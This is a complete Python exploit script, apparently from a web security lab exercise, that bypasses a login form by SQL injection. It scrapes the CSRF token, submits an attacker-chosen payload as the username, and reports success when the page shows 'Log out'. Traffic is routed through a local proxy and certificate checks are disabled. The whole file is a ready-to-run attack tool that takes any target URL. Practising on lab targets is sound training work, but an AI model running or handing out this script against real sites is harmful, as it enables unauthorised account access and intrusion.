import requests
import http
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.warnings 

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf(session, url):
    response = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")["value"] 
    return csrf

def exploit_sqli(session, url, payload)->bool:
    # get csrf
    
    csrf = get_csrf(session, url)
    
    # send the payload

    data = {'csrf' : csrf,
            'username' : payload,
            'password' : '123'}

    response = session.post(url, data=data, verify=False, proxies=proxies)
    
    
    if "Log out" in response.text:
        return True
    else:
        return False


def main():
    # parse input
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("usage : %s [url] [paylaod]" % sys.argv[0])
        exit(1)
    
    # create session
    session = requests.Session()
    
    # get the result   
    if exploit_sqli(session, url, payload):
        print("success")
    else:
        print("failure")

main()